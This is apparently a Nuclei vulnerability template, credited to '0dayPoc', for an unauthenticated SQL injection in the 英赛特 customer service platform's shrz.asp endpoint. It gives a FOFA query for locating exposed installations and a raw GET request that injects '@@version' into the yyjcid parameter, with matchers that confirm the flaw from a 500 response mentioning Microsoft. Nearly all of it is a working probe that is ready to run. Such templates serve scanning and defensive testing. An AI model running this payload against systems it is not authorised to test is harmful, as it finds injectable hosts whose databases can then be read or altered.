id: insite-service-platform-shrz-sqli

info:
  name: "英赛特 shrz.asp 接口SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="inc/js/pngfix.js" && body="英赛特"
      reference: 无
      漏洞存在于英赛特互联网客户服务平台的shrz.asp接口中，攻击者可通过构造恶意SQL查询参数实现数据库敏感信息的非法获取。该漏洞允许未经身份验证的远程攻击者执行任意SQL语句，可能导致系统数据泄露、篡改或服务中断。
  tags: 英赛特

http:
- raw:
  - |
    GET /csccmise/shrz.asp?yyjcid=@@version HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - 'Microsoft'
